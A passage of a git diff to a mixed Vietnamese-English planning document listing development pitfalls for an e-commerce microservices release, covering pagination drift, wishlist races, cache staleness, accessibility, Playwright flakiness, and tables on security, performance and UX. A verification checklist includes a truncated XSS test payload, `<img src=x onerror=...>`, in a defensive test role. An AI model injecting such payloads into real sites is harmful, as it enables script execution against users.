+- v1.1 đã có pipeline OpenAPI codegen → FE typed module enforce enum. Developer assume "FE đúng thì BE không cần validate enum".
+- Spring Boot `@RequestParam String status` không tự reject enum invalid.
+
+**How to avoid:**
+- Use `@RequestParam OrderStatus status` (Java enum) thay vì String — Spring tự reject 400 Bad Request nếu invalid.
+- Spring Data `@Query` với named params (`:status`) hoặc method derivation — tránh string concat.
+- OpenAPI spec đồng bộ: enum trong schema phải match Java enum; codegen verify trên FE side.
+- Validate from < to (server-side), reject if violated.
+- Cap `pageSize <= 100` để chống DoS qua pagination.
+
+**Warning signs:**
+- BE log: `org.hibernate.exception.SQLGrammarException` khi user nhập ký tự lạ.
+- OpenAPI doc enum khác implementation.
+- Curl `?status=INVALID` trả 200 với empty array thay vì 400.
+
+**Phase to address:** Phase planning Order filtering + Advanced search filters. Add Bean Validation `@Pattern` hoặc enum binding.
+
+---
+
+### Pitfall 13: Order filtering — cursor pagination drift
+
+**What goes wrong:**
+Offset pagination (`?page=2&size=20`) bị drift khi data thay đổi: user xem page 2, có đơn mới được tạo → page 3 hiển thị item đã thấy ở page 2 (duplicate) hoặc miss item. UX confusing.
+
+**Why it happens:**
+- Default Spring Data `Pageable` dùng OFFSET/LIMIT.
+- E-commerce orders constantly thêm mới → drift mạnh ở list cao traffic.
+
+**How to avoid:**
+- **Cursor pagination:** Sort by `(created_at DESC, id DESC)` (id để tie-break). Cursor = base64 của `last_created_at + last_id`. Query: `WHERE (created_at, id) < (?cursorCreatedAt, ?cursorId)`.
+- Hoặc giữ offset cho admin (nhỏ, low-write) + cursor cho user-facing order list.
+- Document trong OpenAPI: `nextCursor: string | null` field trong response.
+
+**Warning signs:**
+- User report "đơn xuất hiện 2 lần ở page khác nhau".
+- Admin báo "tổng count khác sum của các page".
+
+**Phase to address:** Phase planning Order filtering. Cho v1.2 visible-first, OFFSET có thể acceptable nếu volume thấp; document tech debt.
+
+---
+
+### Pitfall 14: Wishlist — duplicate add race + stale stock display
+
+**What goes wrong:**
+- **Race:** User double-click "Add to wishlist" → 2 POST đồng thời → 2 row trong wishlist_items. Hoặc giữa 2 tab.
+- **Stale stock:** Wishlist render thumbnail + price + "Còn hàng" badge từ snapshot lúc add. 1 tuần sau, sản phẩm hết hàng / đổi giá → user mở wishlist thấy "Còn hàng" → click "Add to cart" → 409 STOCK_SHORTAGE confused.
+
+**Why it happens:**
+- Race: không có unique constraint `(user_id, product_id)`.
+- Stale: dev snapshot để giảm queries, KHÔNG fetch live.
+
+**How to avoid:**
+- **Race:** Migration include `UNIQUE INDEX idx_wishlist_unique ON wishlist_items(user_id, product_id)`. BE catch `DataIntegrityViolationException` → 200 idempotent (đã có sẵn, OK). FE button disable trong khi mutation pending.
+- **Stale stock:** Wishlist API JOIN với product live data (1 query: `SELECT w.*, p.stock, p.price FROM wishlist_items w JOIN products p ON ... WHERE user_id=?`). Vì wishlist + product cùng product-svc (hoặc user-svc nếu wishlist ở user-svc) — check service boundary. Nếu khác service: gọi product-svc batch endpoint `POST /api/products/batch {ids:[]}`.
+- "Move to cart" button disabled / hiển thị "Hết hàng" nếu stock=0 sau JOIN.
+
+**Warning signs:**
+- DB query: 2 row cùng `(user_id, product_id)`.
+- User báo "đã thêm vào wishlist nhưng add to cart báo hết hàng".
+- Wishlist page price khác product detail page.
+
+**Phase to address:** Phase planning Wishlist. Migration unique constraint từ V4. Wishlist list endpoint phải JOIN product live.
+
+---
+
+### Pitfall 15: Wishlist — infinite scroll memory leak
+
+**What goes wrong:**
+User cuộn 200 items, browser giữ tất cả ảnh + DOM nodes → tab ăn 500MB+ RAM, scroll lag. Trên mobile crash.
+
+**Why it happens:**
+- Dùng IntersectionObserver thuần + append vào array → mọi thứ stay mounted.
+- Next.js `Image` component không tự virtualize.
+
+**How to avoid:**
+- **Pagination thường (page 1, 2, 3...) thay vì infinite scroll** cho wishlist (UX phù hợp hơn — user hiếm khi có > 50 items).
+- Nếu MUST infinite scroll: `react-window` hoặc `@tanstack/react-virtual` để chỉ render visible.
+- Cap items per page = 20.
+
+**Warning signs:**
+- Lighthouse Performance score drop trên page wishlist.
+- DevTools Memory profiler cho thấy detached nodes tăng linear với scroll.
+
+**Phase to address:** Phase planning Wishlist. Recommend pagination UI thay infinite scroll cho v1.2.
+
+---
+
+### Pitfall 16: Advanced search filters — facet count caching staleness
+
+**What goes wrong:**
+Sidebar hiển thị "Brand: Dell (24), Asus (18), HP (12)". Counts được cache 5 phút. Admin xóa 10 sản phẩm Dell → user filter Dell → 14 results nhưng badge vẫn nói 24 → user confused, hoặc user filter "in_stock=true" nhưng count chưa cập nhật stock change.
+
+**Why it happens:**
+- Tính facet exact realtime = expensive (multiple GROUP BY queries).
+- TTL cache đơn giản nhưng không invalidate khi data thay đổi.
+
+**How to avoid:**
+- **MVP-friendly:** Tính facets theo current filter set, KHÔNG cache (acceptable nếu < 10K products, query trên indexed columns < 200ms).
+  ```sql
+  SELECT brand, COUNT(*) FROM products
+   WHERE (price BETWEEN ? AND ?) AND in_stock = ?
+   GROUP BY brand;
   ```
-- **Consumer-driven contract tests:** API consumers define expectations
-  - Order Service (consumer) defines what data it expects from Customer Service (provider)
-  - Contract test verifies Customer Service returns expected data
-  - Breaks if Customer Service changes API in breaking way
-  - Prevents integration surprises
-- **End-to-end tests:** Full flow in staging
-  - User creates account → places order → receives confirmation email
-  - Run against all services in staging
-  - Slow; run before production deployment
-- **Load/performance tests:** Verify system handles load
-  - 1000 concurrent users placing orders
-  - Identify bottlenecks (database, slow service)
-  - Baseline response times
+- Nếu cần cache: invalidate khi `ProductService.create/update/delete` (event hook), KHÔNG just TTL.
+- Document "counts là estimate, có thể off plus minus 5%".
 
-**Which phase to address:**
-- **Every feature:** Write tests before shipping
-- **API changes:** Update contract tests; verify consumers still work
-- **Before production deployment:** Run full test suite
+**Warning signs:**
+- Click filter Dell → count khác badge.
+- Admin update product → user search vẫn thấy data cũ > 1 phút.
+
+**Phase to address:** Phase planning Advanced search filters. v1.2 visible-first → no cache, recompute mỗi request.
 
 ---
 
-## SUMMARY TABLE: PITFALLS BY PHASE
+### Pitfall 17: Advanced search filters — OR vs AND logic confusion + URL state explosion
 
-| Pitfall | MVP | Design | Architecture | Implementation | Testing | Production |
-|---------|-----|--------|--------------|-----------------|---------|-----------|
-| Over-engineering services | ✓ | ✓ | | | | |
-| Tight coupling | ✓ | ✓ | ✓ | | | |
-| Shared database | ✓ | ✓ | ✓ | | | |
-| Missing circuit breakers | ✓ | | ✓ | ✓ | ✓ | |
-| N+1 queries | | | ✓ | ✓ | ✓ | |
-| Distributed transactions | ✓ | ✓ | | | | |
-| Eventual consistency confusion | ✓ | ✓ | ✓ | | | |
-| Data sync failures | | ✓ | ✓ | ✓ | | |
-| Cascading failures | | | ✓ | ✓ | ✓ | |
-| Service-to-service auth | ✓ | ✓ | | | | |
-| API Gateway misconfiguration | ✓ | ✓ | | | | |
-| Token/session chaos | ✓ | ✓ | | | | |
-| Input validation gaps | | ✓ | ✓ | ✓ | | |
-| Chatty communication | | | ✓ | ✓ | ✓ | |
-| Inadequate caching | | | ✓ | ✓ | ✓ | |
-| Missing async | | ✓ | ✓ | ✓ | | |
-| Query optimization | | | | ✓ | ✓ | ✓ |
-| Complex local setup | | ✓ | ✓ | ✓ | | |
-| Incomplete error handling | | | ✓ | ✓ | ✓ | |
-| Poor observability | | ✓ | ✓ | ✓ | ✓ | |
-| Missing tests | | | ✓ | ✓ | ✓ | |
+**What goes wrong:**
+- **Logic:** User check Brand=Dell và Brand=Asus → expect "Dell HOẶC Asus" (OR within same facet). Nhưng cũng check "Price 10-20M" → expect "(Dell OR Asus) AND (Price)". Naïve AND-everything → 0 results mọi lúc.
+- **URL state:** Mỗi filter là URL param → `?brand=Dell&brand=Asus&price_min=10&price_max=20&rating=4&in_stock=1&sort=price_asc&page=2&keyword=...` → URL > 2KB → một số proxy (gateway?) cap header size, request fail. Plus: SEO/share link không stable khi filter thay đổi order.
 
-**Key:** Tick mark indicates when to address pitfall
+**Why it happens:**
+- Pure SQL: `WHERE brand IN (?) AND price BETWEEN ? AND ?` đúng pattern.
+- URL: developer dùng từng param riêng thay vì single encoded state.
+
+**How to avoid:**
+- **Logic:** Same-facet = OR (`IN (...)`), cross-facet = AND. Pattern này industry-standard (Amazon, Tiki).
+- **URL state:**
+  - Stable param order (alphabetical) qua `URLSearchParams` sort.
+  - Các param dạng array dùng comma-separated: `?brands=Dell,Asus` (1 param) thay vì `?brand=Dell&brand=Asus` (2 param) — ngắn hơn.
+  - Nếu state phức tạp (> 5 params): consider POST-style search với short-id token (server lưu filter state, URL chỉ ref token) — overkill cho v1.2.
+- Test với 10 filter active → URL phải < 1KB.
+
+**Warning signs:**
+- User check 2 brand → thấy 0 result (nên có ≥ kết quả của 1 brand).
+- URL > 2KB → 414 Request-URI Too Long.
+- Share link với colleague → kết quả khác do param order.
+
+**Phase to address:** Phase planning Advanced search filters. Lock contract trong OpenAPI: query param `brands` là CSV.
 
 ---
 
-## CRITICAL PITFALLS FOR MVP (Must Address First)
+### Pitfall 18: Homepage redesign — hero image LCP regression
 
-1. **Service Decomposition** (Pitfall 1): Define core services around business capabilities
-2. **Database per Service** (Pitfall 3): Each service owns its data
-3. **Distributed Transactions** (Pitfall 6): Use Saga pattern; don't attempt 2PC
-4. **Service Authentication** (Pitfall 10): Implement mTLS or service-to-service tokens
-5. **API Gateway Security** (Pitfall 11): Enforce HTTPS, JWT validation, rate limiting
-6. **Circuit Breakers** (Pitfall 4): Configure before first inter-service call
-7. **Observability** (Pitfall 20): Implement distributed tracing + log aggregation from day 1
-8. **Local Development** (Pitfall 18): docker-compose.yml working before MVP deployment
+**What goes wrong:**
+Hero banner 1920x800 PNG 2MB → LCP > 4s → Lighthouse drop từ 90 xuống 50, SEO penalty, user bounce. v1.1 homepage có thể đơn giản (không hero) → v1.2 thêm hero là regression risk lớn nhất với Web Vitals.
 
----
+**Why it happens:**
+- Designer giao PNG full quality không nén.
+- Dev không dùng `next/image` `priority` prop cho above-fold image.
+- Dev dùng `<img>` thay vì `<Image>` để "tránh cấu hình".
 
-## PREVENTION WORKFLOW
+**How to avoid:**
+- `<Image src="/hero.webp" priority sizes="100vw" width={1920} height={800} alt="..." />` — `priority` preload, `sizes` cho responsive.
+- Convert hero sang WebP (cap 200KB) hoặc AVIF. Có 2 size: mobile (768x400) + desktop (1920x800), `srcSet` qua `next/image` tự handle.
+- Nếu hero là carousel: chỉ slide đầu tiên `priority`, các slide sau lazy.
+- Preload hint: `<link rel="preload" as="image" href="/hero.webp" />` trong `<head>` (Next.js `<Head>`).
 
-1. **Design phase (Week 1-2):**
-   - Review pitfalls 1, 3, 6, 10, 11
-   - Document service boundaries, data ownership, auth strategy
-   - Design saga flow for cross-service transactions
+**Warning signs:**
+- Lighthouse CI fail với LCP > 2.5s.
+- Network tab: hero.png là 2MB.
+- Dev tool "Largest Contentful Paint" element là hero PNG.
 
-2. **Architecture phase (Week 2-3):**
-   - Pitfalls 2, 4, 5, 12, 13, 18
-   - Set up API contracts, circuit breaker config, validation library
-   - Establish docker-compose for local dev
-
-3. **Implementation (Week 3+):**
-   - Pitfalls 7, 8, 9, 14, 15, 16, 17, 19, 21
-   - Implement error handling, caching, async operations
-   - Write tests for each feature
-
-4. **Testing (Week final):**
-   - Pitfalls 4, 9, 17, 20, 21
-   - Load testing for cascading failures, N+1 queries, caching
-   - End-to-end tests for saga flows
-
-5. **Production (Ongoing):**
-   - Monitor all pitfalls 4, 9, 14, 17, 20
-   - Alert on anomalies (cascading failures, slow queries, observability gaps)
-   - Post-mortem on incidents; prevent recurrence
+**Phase to address:** Phase planning Homepage redesign. Lighthouse budget gate trong CI: LCP < 2.5s, image < 500KB.
 
 ---
 
-## REFERENCES
+### Pitfall 19: Homepage redesign — featured product cache mismatch
 
-- Martin Fowler: [Microservices](https://martinfowler.com/articles/microservices.html)
-- Chris Richardson: [Microservices Patterns](https://microservices.io/patterns/)
-- 12-factor app: [https://12factor.net/](https://12factor.net/)
-- [Release It! Design and Deploy Production-Ready Software](https://pragprog.com/titles/mnee2/release-it-second-edition/)
-- Netflix: [Hystrix - Latency and Fault Tolerance](https://github.com/Netflix/Hystrix)
-- [Spring Cloud Sleuth - Distributed Tracing](https://spring.io/projects/spring-cloud-sleuth)
+**What goes wrong:**
+Featured products hiển thị từ Redis cache 1 hour. Admin update giá / xóa product / sold out → homepage vẫn show cũ. User click → 404 hoặc giá khác. Worse: payment-svc tính giá theo product hiện tại, FE display giá cache → user submit giá sai → mismatch ở checkout.
+
+**Why it happens:**
+- Featured = curated list, dev cache để giảm DB load.
+- Cache TTL fixed without invalidation hooks.
+
+**How to avoid:**
+- **Cache structure:** Cache featured **product IDs** (lightweight), nhưng product data luôn fetch fresh từ DB / service.
+- Hoặc cache full data nhưng TTL ngắn (60s) + invalidate trên admin product mutation.
+- v1.2 với traffic thấp: KHÔNG cache, query trực tiếp với `LIMIT 8` trên indexed `featured=true` column.
+
+**Warning signs:**
+- Click featured product → "Sản phẩm không tồn tại" 404.
+- Giá ở homepage khác giá ở product detail.
+- v1.1 đã có pattern "stock snapshot trong cart bị drift" — homepage cache cùng class problem.
+
+**Phase to address:** Phase planning Homepage redesign. Recommend no-cache cho v1.2, document tech debt.
+
+---
+
+### Pitfall 20: Product detail — image gallery a11y/keyboard nav
+
+**What goes wrong:**
+Gallery built bằng `onClick` thuần trên `<div>` → screen reader không announce, keyboard user không tab vào được. Arrow keys không chuyển ảnh. Modal lightbox mở mà không trap focus → tab thoát ra background, Esc không close. Lighthouse Accessibility score drop.
+
+**Why it happens:**
+- Gallery library nhiều cái không a11y-compliant.
+- Dev test bằng mouse, không test keyboard.
+
+**How to avoid:**
+- Dùng Radix UI Dialog hoặc Headless UI cho lightbox — tự handle focus trap + Esc.
+- Image thumbnails là `<button>` (không phải `<div onClick>`), `aria-label="Xem ảnh thứ N"`, `aria-current="true"` cho thumbnail active.
+- Keyboard: ArrowLeft/ArrowRight chuyển ảnh, Enter mở lightbox, Esc đóng.
+- Test bằng Tab key alone — phải tab được vào mọi thumbnail.
+
+**Warning signs:**
+- Lighthouse "Buttons do not have an accessible name".
+- Screen reader (NVDA/VoiceOver) đọc "div" thay vì "Image 2 of 5".
+- Tab key skip qua gallery.
+
+**Phase to address:** Phase planning Product detail enhancements. axe-core check trong Playwright.
+
+---
+
+### Pitfall 21: Product detail — breadcrumb mismatch trên dynamic categories
+
+**What goes wrong:**
+Breadcrumb: "Trang chủ > Laptop > Dell". Nếu user vào product qua search (không qua category), category nào hiển thị? Nếu product thuộc 2 categories ("Laptop" và "Gaming"), breadcrumb pick cái nào? Nếu admin đổi tên category → breadcrumb cũ stale do SSG cache.
+
+**Why it happens:**
+- Schema product → category là many-to-many hoặc primary category không rõ.
+- Breadcrumb generated tại build time (Next ISR/SSG), category change không trigger revalidate.
+
+**How to avoid:**
+- Schema: thêm `products.primary_category_id` (nullable, fallback to first if null).
+- Breadcrumb đến từ `primary_category` chỉ, KHÔNG cố infer từ referrer.
+- Nếu dùng ISR: `revalidate: 60` + on-demand revalidation từ admin webhook khi category đổi.
+- v1.2 đơn giản: SSR thuần (không SSG) cho product detail → luôn fresh, accept latency cost.
+
+**Warning signs:**
+- 2 user vào cùng product link, thấy breadcrumb khác nhau.
+- Admin đổi tên category → product detail vẫn tên cũ.
+
+**Phase to address:** Phase planning Product detail enhancements. SSR cho `/products/[slug]`.
+
+---
+
+### Pitfall 22: UI-02 admin KPI — cross-service N+1 cho dashboard
+
+**What goes wrong:**
+Admin dashboard show 4 KPI: tổng products, low-stock count, total orders today, total users. Naïve impl: 4 separate calls qua gateway → product-svc + product-svc + order-svc + user-svc. Mỗi call full HTTP round-trip qua gateway. p95 ~ 800ms cho dashboard.
+
+Worse: nếu KPI là "top 5 customers" → cần JOIN orders + users CROSS service → loop qua 5 user_id, query user-svc 5 lần (N+1 cross-service).
+
+**Why it happens:**
+- Microservices boundary — không thể JOIN SQL.
+- Gateway không có aggregation endpoint.
+
+**How to avoid:**
+- **Dedicated aggregate endpoint** mỗi service: `GET /api/products/stats?metrics=total,lowStock` trả 1 response. Tương tự `/api/orders/stats?metrics=todayCount,todayRevenue`. Dashboard gọi 3 endpoint parallel (Promise.all) thay vì 4+.
+- Frontend `Promise.allSettled` → nếu 1 service down, KPI khác vẫn hiển thị (graceful degradation).
+- Cho top-customers: order-svc tự lưu denormalized `customer_display_name` snapshot (giống pattern Reviews ở Pitfall 5).
+- Cache KPI 30s ở FE (SWR `dedupingInterval`).
+
+**Warning signs:**
+- Admin dashboard load > 1s.
+- Network tab: 4+ requests cho 1 page.
+- 1 service slow → cả dashboard hang.
+
+**Phase to address:** Phase planning UI-02 closure. Define `/stats` endpoint per service.
+
+---
+
+### Pitfall 23: UI-02 admin KPI — cache vs realtime tradeoff
+
+**What goes wrong:**
+Admin expect realtime (vừa duyệt order xong, KPI phải update). Nếu cache 5 phút → stale → admin confusion. Nếu no-cache → mỗi reload hit DB heavy aggregations.
+
+**Why it happens:**
+- "KPI" mơ hồ giữa realtime ops dashboard và analytics dashboard.
+
+**How to avoid:**
+- **Định nghĩa scope:** v1.2 KPI là **realtime ops** (4 cards đơn giản: count from indexed columns) → KHÔNG cache, query nhanh < 50ms.
+- KHÔNG dùng materialized view cho v1.2 (overkill).
+- "Last refresh: HH:MM:SS" hiển thị ở UI để admin biết.
+- Auto-refresh mỗi 30s (interval) hoặc manual refresh button.
+
+**Warning signs:**
+- Admin báo "tôi vừa duyệt xong tại sao chưa update".
+- DB CPU spike khi nhiều admin cùng mở dashboard.
+
+**Phase to address:** Phase planning UI-02 closure.
+
+---
+
+### Pitfall 24: Playwright re-baseline — stale selectors + race với async data
+
+**What goes wrong:**
+v1.1 Playwright tests viết `page.click('text=Đăng nhập')`. v1.2 homepage redesign đổi thành `text=Sign in` hoặc icon-only button → test fail. Hoặc test `await page.click('.add-to-cart-btn')` → CSS class thay đổi → fail. Race: `page.click('button[name=submit]')` rồi `expect(page.locator('text=Success')).toBeVisible()` — submit là async + redirect, success message ở page khác → test pass intermittently (flaky).
+
+**Why it happens:**
+- Selector dùng text content / CSS class instead of stable `data-testid`.
+- Test không await network idle / specific request response.
+
+**How to avoid:**
+- **Selector strategy:**
+  - Best: `data-testid="login-submit"` (immune to text/style change).
+  - Good: role-based `page.getByRole('button', {name: 'Đăng nhập'})` — vẫn break khi đổi text nhưng meaningful.
+  - Bad: `.btn-primary` (style class).
+- **Race avoidance:**
+  - `await page.waitForResponse(r => r.url().includes('/api/users/auth/login') && r.ok())` trước assertion.
+  - `await page.waitForURL('/profile')` cho redirect.
+  - KHÔNG dùng `await page.waitForTimeout(1000)` (anti-pattern).
+- **Re-baseline strategy:** đi từng test, update selectors, run `--reporter=list` xem fail nào, fix per file. KHÔNG mass replace.
+
+**Warning signs:**
+- Test pass local, fail CI (race condition exposed bởi slower env).
+- 1 test "đôi khi pass đôi khi fail" (flaky).
+- Selector match nhiều element ("strict mode violation").
+
+**Phase to address:** Phase planning Playwright re-baseline. Add `data-testid` audit cho mọi v1.2 component mới.
+
+---
+
+### Pitfall 25: Cross-cutting — traceId KHÔNG propagate cho new endpoints
+
+**What goes wrong:**
+v1.0/v1.1 đã có pattern: gateway sinh traceId, propagate qua header `X-Trace-Id`, mọi service log với traceId, ApiErrorResponse envelope include traceId → debug 1 request xuyên service. v1.2 thêm endpoints mới (`/api/wishlist`, `/api/reviews`, `/api/addresses`...). Nếu controller mới không inherit `BaseController` hoặc filter mới không apply trên path mới → response thiếu traceId → debug khó.
+
+**Why it happens:**
+- Spring filter chain config có thể explicit list paths.
+- Mới copy-paste controller, miss base class.
+- OpenAPI spec mới không include traceId trong error schema.
+
+**How to avoid:**
+- Spring filter `TraceIdFilter` apply `/**` (mọi path) trong `WebMvcConfigurer`.
+- Mọi controller extend `BaseController` hoặc dùng `@RestControllerAdvice` global exception handler — đã đặt traceId vào MDC.
+- ApiErrorResponse envelope (đã ship v1.0) là **shared schema** — mọi error path qua `@ExceptionHandler` → tự include traceId.
+- Test integration: gọi endpoint mới với header `X-Trace-Id: test-123` → response (success + error) phải echo traceId.
+
+**Warning signs:**
+- Mở DevTools, response endpoint mới không có header `X-Trace-Id`.
+- Error response thiếu field `traceId` (chỉ có `code`, `message`).
+- Service log không có traceId trong context khi debug bug ở endpoint mới.
+
+**Phase to address:** Phase planning mọi feature có endpoint mới + integration verify phase.
+
+---
+
+### Pitfall 26: Cross-cutting — ApiErrorResponse cho new error branches
+
+**What goes wrong:**
+v1.1 FE `services/http.ts` dispatch 5 failure branches (401, 403, 409 STOCK_SHORTAGE, 422, 5xx). v1.2 thêm: review `409 DUPLICATE_REVIEW` (user đã review product), wishlist `409 ITEM_EXISTS`, address `409 LIMIT_EXCEEDED` (max 10 addresses). Nếu BE return 409 với code mới mà FE dispatcher không decode → fallback toast generic "Đã xảy ra lỗi" → UX kém, user không biết phải làm gì.
+
+**Why it happens:**
+- FE typed module sinh từ OpenAPI nhưng error responses thường đặc tả lỏng (`oneOf` trong response 4xx).
+- ApiError dispatcher hardcode list domainCode trong v1.1 → quên update khi thêm code mới.
+
+**How to avoid:**
+- **Định nghĩa enum `DomainErrorCode` trong shared module** (BE Java enum + FE TS enum sinh ra từ OpenAPI). Mọi error code mới phải register vào enum này.
+- ApiError dispatcher dùng switch trên domainCode — fallback case throw `UnknownDomainCodeError` ở dev mode để dev thấy missing handler.
+- Mỗi feature plan trong v1.2 mở một section "Error codes added" với list code + FE handler + i18n message.
+- E2E test: trigger từng error case → assert toast text Việt đúng.
+
+**Warning signs:**
+- FE toast hiển thị "[object Object]" hoặc raw JSON.
+- User báo "tôi không hiểu lỗi này".
+- BE return 409 nhưng FE handle như 500.
+
+**Phase to address:** Phase planning mọi feature + integration verify.
+
+---
+
+## Technical Debt Patterns
+
+| Shortcut | Immediate Benefit | Long-term Cost | When Acceptable |
+|----------|-------------------|----------------|-----------------|
+| Denormalize `averageRating` không recompute từ scratch | Tránh AVG query | Drift sau N edit/delete | Never (recompute nếu denormalize) |
+| Hard-delete addresses không snapshot trong order | Schema đơn giản | FK violation hoặc orphaned data | Acceptable nếu giữ snapshot pattern v1.1 |
+| Cache featured products TTL không invalidate | Latency thấp | Stale data sau admin update | Acceptable nếu TTL < 60s + warning UX |
+| KHÔNG có separate password-change endpoint | Code ít hơn | Account takeover risk | Never |
+| Disable email change UI ở v1.2 | Skip 2-step verify flow | User phải contact admin | Acceptable cho v1.2, plan v1.3 |
+| Offset pagination thay cursor cho order list | Default Spring Data | Drift khi data thay đổi | Acceptable nếu volume thấp + hidden từ user |
+| `<img>` thay vì `<Image>` cho hero | Đơn giản | LCP regression, SEO | Never trên public pages |
+| No-cache facet count (recompute mỗi request) | Always fresh | DB load tăng | Acceptable cho v1.2 (< 10K products) |
+| Snapshot reviewer displayName | Tránh cross-service N+1 | Tên cũ nếu user đổi tên | Acceptable (industry pattern) |
+| `data-testid` chỉ vài component | Test chạy nhanh | Re-baseline đau khi UI thay đổi | Never — add testid trên mọi interactive element |
+
+---
+
+## Integration Gotchas
+
+| Integration | Common Mistake | Correct Approach |
+|-------------|----------------|------------------|
+| product-svc <-> user-svc (review reviewer name) | Loop fetch user-svc per review | Snapshot displayName vào ReviewEntity lúc create |
+| order-svc <-> product-svc (order filter joins) | Cross-service JOIN | Denormalize `productName, productThumbnail` vào OrderItem (đã ship v1.1) |
+| Gateway <-> admin dashboard | 4+ separate calls cho KPI | Per-service `/stats` endpoint, FE Promise.all |
+| middleware <-> auth endpoints | 401 redirect cho cả `/api/users/auth/login` | `AUTH_PATHS_NO_REDIRECT` skiplist (đã fix bug v1.1) |
+| Flyway <-> multi-PR concurrent | Cùng V-number trên cùng service | Reserve V-numbers trong MILESTONES.md trước plan-phase |
+| OpenAPI codegen <-> new error code | Add error code BE-only | Update enum shared, regenerate FE module, update dispatcher |
+| traceId <-> new controllers | Filter chỉ apply path cũ | Filter `/**` + global `@RestControllerAdvice` |
+| `next/image` <-> external CDN | Domain không whitelist trong `next.config.js` | `images.remotePatterns` config |
+| Postgres <-> default-flag concurrency | 2 UPDATE riêng | Partial unique index `WHERE is_default = true` |
+| Multipart upload <-> avatar | Trust client MIME | Magic byte check + re-encode |
+
+---
+
+## Performance Traps
+
+| Trap | Symptoms | Prevention | When It Breaks |
+|------|----------|------------|----------------|
+| N+1 reviews -> users lookup | Product list TTFB > 800ms | Snapshot reviewer name | 50+ reviews per page |
+| Facet count GROUP BY mọi request | DB CPU spike | Cache 60s + invalidate trên mutation | 10K+ products + 50+ concurrent admin |
+| Cross-service KPI loop | Dashboard load > 1s | `/stats` endpoint per service | Mọi scale |
+| Hero image 2MB PNG | LCP > 4s | WebP + `next/image priority` | Mọi traffic |
+| Wishlist infinite scroll | RAM 500MB+ | Pagination + virtualization | 100+ items per user |
+| Offset pagination order list | Drift, slow OFFSET 1000+ | Cursor pagination | 10K+ orders per user |
+| AVG/COUNT mỗi request product detail | TTFB > 200ms | Denormalize + recompute | 1K+ reviews per product |
+| Avatar serve qua Spring static | Heap pressure khi nhiều concurrent | CDN hoặc dedicated endpoint với cache header | 100+ concurrent users |
+
+---
+
+## Security Mistakes (domain-specific, không OWASP generic)
+
+| Mistake | Risk | Prevention |
+|---------|------|------------|
+| Review render qua `dangerouslySetInnerHTML` | Stored XSS -> JWT từ localStorage bị steal | React tự escape + BE sanitize |
+| Avatar upload trust MIME từ client | RCE qua polyglot, XSS qua HTML upload | Magic byte check + re-encode + cap size |
+| Email change không verify | Account takeover qua reset link tới email attacker | 2-step confirm hoặc disable UI |
+| Password change không verify oldPassword | Session hijack -> permanent lockout | Dedicated endpoint require oldPassword |
+| Wishlist endpoint không check `userId == authUser` | IDOR — user A xem/edit wishlist user B | Mọi wishlist endpoint filter `user_id = currentUser.id` |
+| Address book endpoint không check ownership | IDOR — đọc địa chỉ user khác | Same — filter ownership server-side |
+| Admin KPI endpoint không kiểm tra ROLE_ADMIN | User thường xem stats nhạy cảm | `@PreAuthorize("hasRole('ADMIN')")` |
+| Search/filter SQL via string concat | SQL injection | Spring Data method derivation hoặc named params |
+| Order filter không scope theo userId | User A đọc order user B qua manipulated filter | BE force `WHERE user_id = currentUser.id` cho non-admin |
+| middleware skip static assets bằng regex sai | Auth check chạy trên `_next/static` -> slow + có thể leak path qua redirect | Whitelist explicit `_next/static`, `_next/image`, `favicon.ico` |
+
+---
+
+## UX Pitfalls
+
+| Pitfall | User Impact | Better Approach |
+|---------|-------------|-----------------|
+| Wishlist "stock" snapshot stale | User confused: "đã có hàng sao add to cart fail" | JOIN live product data khi list wishlist |
+| Filter trả 0 results không suggest | User stuck, bounce | "Không tìm thấy kết quả với filter X. Thử bỏ filter Y" |
+| Date range filter không có timezone hint | User Việt Nam thấy đơn "đêm qua" miss | Document `[from, to)` + auto-detect TZ từ browser |
+| Address book không có default flag visible | Checkout autofill random | Badge "Mặc định" + radio chọn default |
+| Avatar upload không show preview | User upload xong mới thấy crop sai | Crop UI ngay sau chọn file (react-easy-crop) |
+| Review submit không có loading state | Double-submit -> duplicate review | Disable button + skeleton |
+| Password change success không revoke other sessions | User lo "có ai login khác không" | Hiển thị "Sẽ đăng xuất các thiết bị khác" + thực hiện |
+| Order filter empty state thiếu CTA | User không biết phải làm gì | "Chưa có đơn hàng. [Mua sắm ngay]" |
+| Search filter facet count = 0 không grey out | User click -> empty results | Disable + tooltip "Không có sản phẩm trong filter này" |
+| Homepage hero CLS (Cumulative Layout Shift) | Layout nhảy khi image load | Specify `width`/`height` + aspect ratio reserve space |
+| Breadcrumb không clickable | Không thể navigate ngược | `<Link>` từng segment |
+| Image gallery không hiển thị "X/N" indicator | User mất context | "2 / 8" trên góc gallery |
+
+---
+
+## "Looks Done But Isn't" Checklist
+
+- [ ] **Wishlist:** Verify unique constraint `(user_id, product_id)` và "move to cart" check stock live.
+- [ ] **Reviews:** Verify XSS payload `<img src=x onerror=...>` render là plain text, không execute.
+- [ ] **Reviews:** Verify edit + delete recompute average từ scratch (không drift sau 10 edits).
+- [ ] **Address book:** Verify hard-delete address không ảnh hưởng order đã đặt (snapshot intact).
+- [ ] **Address book:** Verify partial unique index ngăn 2 default cùng lúc.
+- [ ] **Profile editing:** Verify password change require oldPassword (test với JWT valid + sai oldPassword -> 400).
+- [ ] **Profile editing:** Verify email change disabled hoặc 2-step confirm (không phải PATCH thẳng).
+- [ ] **Profile editing:** Verify avatar upload reject `.html`, `.exe`, polyglot, > 2MB.
+- [ ] **Order filter:** Verify timezone — đơn 23:59 ngày 30/4 GMT+7 hiển thị ở filter "tháng 4".
+- [ ] **Order filter:** Verify enum binding `?status=INVALID` -> 400, không 200 empty.
+- [ ] **Order filter:** Verify scoping — user A không thấy order user B qua manipulated `userId` param.
+- [ ] **Search filter:** Verify same-facet OR (Brand=Dell + Brand=Asus -> results > Dell only).
+- [ ] **Search filter:** Verify URL < 1KB với 10 filters active.
+- [ ] **Homepage:** Verify Lighthouse LCP < 2.5s sau add hero.
+- [ ] **Homepage:** Verify featured product click -> product detail không 404.
+- [ ] **Product detail:** Verify keyboard nav gallery (Tab + ArrowLeft/Right + Esc).
+- [ ] **Product detail:** Verify breadcrumb ổn định (cùng product -> cùng breadcrumb).
+- [ ] **AUTH-06:** Verify direct visit `/profile` (chưa login) -> 307 redirect qua middleware (không qua API 401).
+- [ ] **AUTH-06:** Verify `/_next/static/...` KHÔNG bị middleware gate.
+- [ ] **AUTH-06:** Verify login redirect loop không tái xuất (sai password -> banner, không loop).
+- [ ] **UI-02:** Verify dashboard load < 1s với 4 KPI parallel.
+- [ ] **UI-02:** Verify dashboard graceful degradation — 1 service down, 3 KPI khác vẫn hiển thị.
